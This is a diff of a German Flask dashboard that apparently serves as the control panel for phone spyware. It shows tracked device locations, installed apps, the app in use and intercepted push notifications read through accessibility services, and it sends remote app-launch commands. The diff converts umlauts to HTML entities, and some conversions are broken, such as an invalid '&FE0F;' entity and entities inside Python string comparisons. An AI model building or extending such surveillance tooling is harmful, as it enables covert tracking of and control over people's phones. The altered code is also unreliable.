@@ -150,7 +150,7 @@ def index():
         <div class="main-content">
             <div class="header-bar">
                 <div class="header-title">
-                    <h1>Echtzeit Überwachungs-Zentrale</h1>
+                    <h1>Echtzeit &Uuml;berwachungs-Zentrale</h1>
                 </div>
                 <div class="card download-box" style="margin: 0; padding: 12px 20px; display: flex; align-items: center; gap: 15px;">
                     <span style="font-size: 14px; font-weight: 600;">System-Client auf Handy installieren:</span>
@@ -176,12 +176,12 @@ def index():
                 <div>
                     <div class="card control-panel">
                         <div class="card-title">🛠️ Live App-Fernsteuerung</div>
-                        <p style="font-size: 13px; color: #64748b; margin-bottom: 12px;">Wähle ein aktives Gerät und die zu startende App aus:</p>
+                        <p style="font-size: 13px; color: #64748b; margin-bottom: 12px;">W&auml;hle ein aktives Ger&auml;t und die zu startende App aus:</p>
                         <select id="deviceSelect" onchange="updateAppDropdown()">
-                            <option value="">-- Gerät auswählen --</option>
+                            <option value="">-- Ger&auml;t ausw&auml;hlen --</option>
                         </select>
                         <select id="appSelect" disabled>
-                            <option value="">-- Zuerst Gerät wählen --</option>
+                            <option value="">-- Zuerst Ger&auml;t w&auml;hlen --</option>
                         </select>
                         <button onclick="sendeRemoteBefehl()">🚀 App-Startbefehl senden</button>
                     </div>
@@ -190,7 +190,7 @@ def index():
             </div>
 
             <div class="card" style="margin-top: 5px;">
-                <div class="card-title">📱 Registrierte Geräte & Ausgelesene Bedienungshilfen-Daten</div>
+                <div class="card-title">📱 Registrierte Ger&auml;te &amp; Ausgelesene Bedienungshilfen-Daten</div>
                 <div style="overflow-x: auto;">
                     <table class="device-table">
                         <thead>
@@ -207,7 +207,7 @@ def index():
                         </thead>
                         <tbody id="device-table-body">
                             <tr>
-                                <td colspan="8" style="text-align: center; color: #94a3b8; font-style: italic; padding: 30px;">Warte auf Datenübertragung vom Server...</td>
+                                <td colspan="8" style="text-align: center; color: #94a3b8; font-style: italic; padding: 30px;">Warte auf Daten&uuml;bertragung vom Server...</td>
                             </tr>
                         </tbody>
                     </table>
@@ -216,19 +216,22 @@ def index():
 
         </div>
 
-        <script id="server-data" type="application/json">%ERSATZ_FUER_DATEN%</script>
+        <script id="server-data" type="application/json">
+            %ERSATZ_FUER_DATEN%
+        </script>
 
         <script>
             let map;
             let markerMap = {};
             let linienMap = {};
-            
-            // Sicheres Laden und Parsen der Daten über das JSON-Skript-Tag
             let geraete = {};
+            
+            // Absolut sicheres Auslesen ohne eval() oder Inline-Ersetzungsfehler
             try {
-                geraete = JSON.parse(document.getElementById('server-data').textContent);
+                const dataText = document.getElementById('server-data').textContent;
+                geraete = JSON.parse(dataText);
             } catch(e) {
-                console.error("Fehler beim Parsen der initialen Serverdaten:", e);
+                console.error("Daten konnten nicht initialisiert werden:", e);
             }
             
             let letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);
@@ -292,7 +295,7 @@ def index():
 
                 const devSelect = document.getElementById('deviceSelect');
                 const aktuellerWert = devSelect.value;
-                devSelect.innerHTML = '<option value="">-- Gerät auswählen --</option>';
+                devSelect.innerHTML = '<option value="">-- Ger&auml;t ausw&auml;hlen --</option>';
                 for (const name in daten) {
                     const opt = document.createElement('option');
                     opt.value = name;
@@ -305,7 +308,7 @@ def index():
                 const tbody = document.getElementById('device-table-body');
                 const keys = Object.keys(daten);
                 if (keys.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #94a3b8; padding: 20px;">Keine Geräte aktiv</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #94a3b8; padding: 20px;">Keine Ger&auml;te aktiv</td></tr>';
                     return;
                 }
 
@@ -324,7 +327,7 @@ def index():
                     let appBadgeHTML = "";
                     let roherText = info.aktuelle_app;
                     if(roherText.includes("[BLOCKIERT]")) {
-                        appBadgeHTML = '<span class="badge badge-danger" style="display:block; margin-bottom:4px;">🚫 Sperre ausgelöst</span><small style="color:#b91c1c; font-weight:bold;">' + roherText.replace("[BLOCKIERT] ","") + '</small>';
+                        appBadgeHTML = '<span class="badge badge-danger" style="display:block; margin-bottom:4px;">🚫 Sperre ausgel&ouml;st</span><small style="color:#b91c1c; font-weight:bold;">' + roherText.replace("[BLOCKIERT] ","") + '</small>';
                     } else if(roherText.includes("[🔔 PUSH")) {
                         appBadgeHTML = '<span class="badge badge-purple" style="display:block; margin-bottom:4px;">🔔 Push abgefangen</span><small style="color:#581c87; font-weight:600; display:block; background:#f3e8ff; padding:4px; border-radius:4px;">' + roherText.split("]: ")[1] + '</small>';
                     } else {
@@ -339,7 +342,7 @@ def index():
                         '<td style="max-width:350px; word-wrap:break-word;">' + appBadgeHTML + '</td>' +
                         '<td><span class="badge badge-success">♿ ' + info.bedienungshilfen + '</span></td>' +
                         '<td><small style="color:#64748b; font-weight:600;">' + zeitText + '</small></td>' +
-                        '<td style="text-align: right;"><a href="/delete/' + encodeURIComponent(name) + '" class="badge badge-danger" style="text-decoration:none;" onclick="return confirm(\'Gerät löschen?\');">Löschen 🗑️</a></td>' +
+                        '<td style="text-align: right;"><a href="/delete/' + encodeURIComponent(name) + '" class="badge badge-danger" style="text-decoration:none;" onclick="return confirm(\'Ger&auml;t l&ouml;schen?\');">L&ouml;schen 🗑&FE0F;</a></td>' +
                     '</tr>';
                 }
                 tbody.innerHTML = html;
@@ -351,7 +354,7 @@ def index():
                 const gewaehltesGeraet = devSelect.value;
 
                 if (!gewaehltesGeraet || !geraete[gewaehltesGeraet]) {
-                    appSelect.innerHTML = '<option value="">-- Zuerst Gerät wählen --</option>';
+                    appSelect.innerHTML = '<option value="">-- Zuerst Ger&auml;t w&auml;hlen --</option>';
                     appSelect.disabled = true;
                     return;
                 }
@@ -361,7 +364,7 @@ def index():
                 if (typeof appsRaw === 'string') { try { appsRaw = JSON.parse(appsRaw); } catch(e) { appsRaw = []; } }
 
                 if (Array.isArray(appsRaw) && appsRaw.length > 0) {
-                    appSelect.innerHTML = '<option value="">-- Bitte App auswählen --</option>';
+                    appSelect.innerHTML = '<option value="">-- Bitte App ausw&auml;hlen --</option>';
                     appsRaw.forEach(app => {
                         const opt = document.createElement('option');
                         opt.value = app.paket;
@@ -378,7 +381,7 @@ def index():
                 const paketName = document.getElementById('appSelect').value;
 
                 if (!geraeteName || !paketName) {
-                    alert("Bitte wähle ein Gerät und eine Ziel-App aus!");
+                    alert("Bitte w&auml;hle ein Ger&auml;t und eine Ziel-App aus!");
                     return;
                 }
 
@@ -390,7 +393,7 @@ def index():
                     })
                     .then(res => res.json())
                     .then(data => {
-                        if (data.status === "success") { alert("Erfolgreich gespeichert! Das Handy startet die App beim nächsten Funkspruch."); }
+                        if (data.status === "success") { alert("Erfolgreich gespeichert! Das Handy startet die App beim n&auml;chsten Funkspruch."); }
                         else { alert("Fehler: " + data.error); }
                     });
                 }
@@ -402,7 +405,7 @@ def index():
                     .then(neueDaten => {
                         updateUI(neueDaten);
                         letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);
-                        document.getElementById('zeit-seit-update').innerHTML = "⏱️ Letzter Webseiten-Abruf: Gerade eben";
+                        document.getElementById('zeit-seit-update').innerHTML = "⏱&FE0F; Letzter Webseiten-Abruf: Gerade eben";
                     });
             }
 
@@ -468,7 +471,7 @@ def upload():
         return jsonify({"error": "Missing JSON"}), 400
         
     data = request.get_json()
-    roher_name = str(data.get("name", "Unbekanntes Gerät"))
+    roher_name = str(data.get("name", "Unbekanntes Ger&auml;t"))
     absender_ip = request.remote_addr or "IP"
     geraete_name = f"{roher_name} ({absender_ip[-4:]})"
 
@@ -476,7 +479,7 @@ def upload():
         lat = float(data.get("lat"))
         lon = float(data.get("lon"))
     except (TypeError, ValueError):
-        return jsonify({"error": "Ungültige Koordinaten"}), 400
+        return jsonify({"error": "Ung&uuml;ltige Koordinaten"}), 400
         
     akku = str(data.get("akku", "??"))
     netzwerk = str(data.get("netzwerk", "Unbekannt"))
@@ -487,7 +490,7 @@ def upload():
     if isinstance(installierte_apps, (list, dict)):
         installierte_apps = json.dumps(installierte_apps)
         
-    bedienungshilfen = "Aktiv" if aktuelle_app != "Keine App geöffnet" else "Inaktiv"
+    bedienungshilfen = "Aktiv" if aktuelle_app != "Keine App ge&ouml;ffnet" else "Inaktiv"
 
     historie = []
     befehl_fuer_handy = "{}"
@@ -547,7 +550,7 @@ def delete_device(name):
             delete_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{name}"
             requests.delete(delete_url, headers=SUPABASE_HEADERS, timeout=5)
         except Exception as e:
-            print(f"Fehler beim Löschen in Supabase: {e}")
+            print(f"Fehler beim L&ouml;schen in Supabase: {e}")
     return redirect(url_for('index'))
     
 if __name__ == '__main__':
